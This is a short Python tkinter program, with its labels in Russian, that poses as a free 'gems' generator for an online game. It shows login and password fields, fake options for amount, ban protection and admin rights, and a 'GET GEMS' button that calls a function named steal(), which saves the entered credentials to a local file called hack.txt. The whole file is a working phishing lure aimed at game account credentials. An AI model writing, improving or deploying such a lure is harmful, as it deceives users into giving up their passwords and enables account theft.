from tkinter import *

def steal():
    f = open('hack.txt', 'w')
    f.write(en.get() + '\n' + en2.get())
    f.close()

def color():
    if stealer['bg'] == 'grey22':
        stealer['bg'] = 'whitesmoke'
    else:
        stealer['bg'] = 'grey22'

stealer = Tk()

stealer.geometry('220x150+700+300')

stealer['bg'] == 'whitesmoke'

lb = Label(stealer, text='Логин').grid(row=1)
en = Entry(stealer, width=15)
en.grid(row=2)

lb2 = Label(stealer, text='Пароль').grid(row=3)
en2 = Entry(stealer, width=15)
en2.grid(row=4)

mas = ('10 000', '20 000', '30 000', '40 000', '50 000')
sb = Spinbox(stealer, width=14, values=mas).place(x=0, y=90)

rb1 = Radiobutton(stealer, text="Без защиты", value=1).place(x=100, y=90)
rb2 = Radiobutton(stealer, text="Защита от бана", value=2).place(x=100, y=60)

сb1 = Checkbutton(stealer, text="Выдача админки").place(x=100, y=30)

b = Button(stealer, text='ПОЛУЧИТЬ ГЕМЫ',background="#555", foreground="#ccc", command=steal)
b.place(x=0, y=120)

b = Button(stealer, text='Темная тема', command=color)
b.place(x=120, y=0)

stealer.mainloop()